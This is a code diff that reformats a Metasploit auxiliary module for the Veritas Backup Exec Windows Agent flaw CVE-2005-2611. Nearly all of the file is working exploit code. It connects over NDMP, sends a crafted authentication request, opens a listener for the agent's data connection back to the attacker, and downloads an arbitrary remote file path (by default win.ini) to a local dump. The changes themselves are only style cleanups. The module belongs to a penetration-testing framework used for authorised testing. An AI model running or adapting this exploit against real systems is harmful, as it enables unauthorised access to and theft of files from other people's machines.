@@ -1,73 +1,67 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 require 'msf/core'
 
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::NDMP
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Veritas Backup Exec Windows Remote File Access',
-      'Description'    => %q{
-        This module abuses a logic flaw in the Backup Exec Windows Agent to download
-        arbitrary files from the system. This flaw was found by someone who wishes to
-        remain anonymous and affects all known versions of the Backup Exec Windows Agent. The
-        output file is in 'MTF' format, which can be extracted by the 'NTKBUp' program
-        listed in the references section. To transfer an entire directory, specify a
-        path that includes a trailing backslash.
-      },
-      'Author'         => [ 'hdm', 'Unknown' ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
-          ['CVE', '2005-2611'],
-          ['OSVDB', '18695'],
-          ['BID', '14551'],
-          ['URL', 'http://www.fpns.net/willy/msbksrc.lzh'],
-        ],
-      'Actions'     =>
-        [
-          ['Download']
-        ],
-      'DefaultAction' => 'Download'
-      ))
+                      'Name'           => 'Veritas Backup Exec Windows Remote File Access',
+                      'Description'    => %q(
+                        This module abuses a logic flaw in the Backup Exec Windows Agent to download
+                        arbitrary files from the system. This flaw was found by someone who wishes to
+                        remain anonymous and affects all known versions of the Backup Exec Windows Agent. The
+                        output file is in 'MTF' format, which can be extracted by the 'NTKBUp' program
+                        listed in the references section. To transfer an entire directory, specify a
+                        path that includes a trailing backslash.
+                      ),
+                      'Author'         => [ 'hdm', 'Unknown' ],
+                      'License'        => MSF_LICENSE,
+                      'References'     =>
+                        [
+                          ['CVE', '2005-2611'],
+                          ['OSVDB', '18695'],
+                          ['BID', '14551'],
+                          ['URL', 'http://www.fpns.net/willy/msbksrc.lzh']
+                        ],
+                      'Actions' =>
+                        [
+                          ['Download']
+                        ],
+                      'DefaultAction' => 'Download'))
 
     register_options(
       [
         Opt::RPORT(10000),
         OptAddress.new('LHOST',
-          [
-            false,
-            "The local IP address to accept the data connection"
-          ]
-        ),
+                       [
+                         false,
+                         "The local IP address to accept the data connection"
+                       ]),
         OptPort.new('LPORT',
-          [
-            false,
-            "The local port to accept the data connection"
-          ]
-        ),
+                    [
+                      false,
+                      "The local port to accept the data connection"
+                    ]),
         OptString.new('RPATH',
-          [
-            true,
-            "The remote filesystem path to download",
-            "C:\\Windows\\win.ini"
-          ]
-        ),
+                      [
+                        true,
+                        "The remote filesystem path to download",
+                        "C:\\Windows\\win.ini"
+                      ]),
         OptString.new('LPATH',
-          [
-            true,
-            "The local filename to store the exported data",
-            "backupexec_dump.mtf"
-          ]
-        ),
-      ], self.class)
+                      [
+                        true,
+                        "The local filename to store the exported data",
+                        "backupexec_dump.mtf"
+                      ])
+      ], self.class
+    )
   end
 
   def run
@@ -76,8 +70,8 @@ class MetasploitModule < Msf::Auxiliary
     lfd = File.open(datastore['LPATH'], 'wb')
 
     connect
-    data = ndmp_recv()
-    if (not data)
+    data = ndmp_recv
+    unless data
       print_error("Did not receive a response from the agent")
       disconnect
       return
@@ -104,13 +98,12 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status("Sending magic authentication request...")
     ndmp_send(auth)
-    data = ndmp_recv()
-    if (not data)
+    data = ndmp_recv
+    unless data
       print_error("Did not receive a response to our authentication request")
       disconnect
       return
     end
-
 
     #
     # Create our listener for the data connection
@@ -140,8 +133,8 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status("Sending data connection request...")
     ndmp_send(conn)
-    data = ndmp_recv()
-    if (not data)
+    data = ndmp_recv
+    unless data
       print_error("Did not receive a response to our data connection request")
       sfd.close
       disconnect
@@ -152,9 +145,8 @@ class MetasploitModule < Msf::Auxiliary
     # Wait for the agent to connect back
     #
     print_status("Waiting for the data connection...")
-    rfd = sfd.accept()
+    rfd = sfd.accept
     sfd.close
-
 
     #
     # Create the Mover Set Record Size request
@@ -171,8 +163,8 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status("Sending transfer parameters...")
     ndmp_send(msrs)
-    data = ndmp_recv()
-    if (not data)
+    data = ndmp_recv
+    unless data
       print_error("Did not receive a response to our parameters request")
       disconnect
       return
@@ -182,11 +174,11 @@ class MetasploitModule < Msf::Auxiliary
     # Define our tranfer parameters
     #
     xenv =
-    [
-      ['USERNAME', ''],
-      ['BU_EXCLUDE_ACTIVE_FILES', '0'],
-      ['FILESYSTEM', "\"\\\\#{datastore['RHOST']}\\#{datastore['RPATH']}\",v0,t0,l0,n0,f0"]
-    ]
+      [
+        ['USERNAME', ''],
+        ['BU_EXCLUDE_ACTIVE_FILES', '0'],
+        ['FILESYSTEM', "\"\\\\#{datastore['RHOST']}\\#{datastore['RPATH']}\",v0,t0,l0,n0,f0"]
+      ]
 
     #
     # Create the DATA_START_BACKUP request
@@ -207,7 +199,7 @@ class MetasploitModule < Msf::Auxiliary
     # Encode the transfer parameters
     #
     xenv.each do |e|
-      k,v = e
+      k, v = e
 
       # Variable
       bkup += [k.length].pack('N')
@@ -224,8 +216,8 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status("Sending backup request...")
     ndmp_send(bkup)
-    data = ndmp_recv()
-    if (not data)
+    data = ndmp_recv
+    unless data
       print_error("Did not receive a response to our backup request")
       disconnect
       return
@@ -245,8 +237,8 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status("Sending environment request...")
     ndmp_send(genv)
-    data = ndmp_recv()
-    if (not data)
+    data = ndmp_recv
+    unless data
       print_error("Did not receive a response to our environment request")
       disconnect
       return
@@ -271,7 +263,5 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status("Transferred #{bcnt} bytes.")
     disconnect
-
   end
-
 end
